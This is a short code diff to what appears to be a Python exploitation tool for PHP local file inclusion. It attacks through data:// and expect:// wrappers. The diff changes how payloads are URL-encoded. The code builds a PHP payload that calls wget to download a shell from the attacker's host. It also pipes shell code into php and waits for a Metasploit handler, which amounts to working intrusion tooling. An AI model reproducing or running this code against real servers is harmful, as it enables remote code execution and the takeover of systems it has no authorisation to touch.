@@ -9,6 +9,7 @@ import subprocess
 import requests
 import base64
 import textwrap
+from urllib import quote_plus
 
 
 t = Terminal()
@@ -74,7 +75,7 @@ class Data:
                 payload_file.close()
             else:
                 payload = "<?php system('wget http://{0}:8000/{1}.php'); ?>".format(lhost, shell)
-            encoded_payload = payload.encode('base64').replace("/","%2f").replace("+","%2b")
+            encoded_payload = quote_plus(payload.encode('base64'))
 
             # Build data wrapper
             data_wrapper = "data://text/html;base64,{0}".format(encoded_payload)
@@ -213,7 +214,9 @@ class Expect:
         # Build payload
         if self.nostager:
             payload_file = open("/tmp/{0}.php".format(shell),"r")
-            payload = "expect://echo \"\\" + payload_file.read() + "\" | php"
+            payload = "expect://echo '\\"
+            payload += quote_plus(payload_file.read())
+            payload += "' \\| php"
             payload_file.close()
             raw_input(t.green(" [!] ") + "Press enter to continue when your metasploit handler is running...") 
         else:
